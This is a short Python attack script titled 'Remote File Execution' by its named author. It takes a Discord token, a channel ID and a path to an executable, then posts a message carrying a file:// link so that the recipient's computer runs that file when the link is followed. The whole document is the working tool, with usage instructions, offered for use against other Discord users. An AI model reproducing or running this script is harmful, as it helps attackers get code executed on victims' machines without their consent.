# Name: Remote File Execution
# Description: Sends URI and allows a file to be executed on the recipient's computer
# Author: Rajiv Govind

import urllib.parse
import requests
import sys


class Ex:

    def __init__(self, token, channel, file_path):
        self.token = token
        self.file_path = file_path
        self.channel_id = channel
        self.headers = {'Authorization': token}

    @property
    def _file_path(self):
        return urllib.parse.quote(self.file_path)

    def execute(self):
        return requests.post(f'https://discordapp.com/api/v6/channels/{self.channel_id}/messages', headers=self.headers, json={'content': f'<file://{self._file_path}>'})


def main():
    if len(sys.argv) < 4:
        print(f'Usage: py {sys.argv[0]} <token> <channel id> <path to executable>')
        sys.exit()

    bearer = sys.argv[1]
    ID = sys.argv[2]
    path = sys.argv[3]

    run = Ex(bearer, ID, path)

    run.execute()


if __name__ == '__main__':
    main()
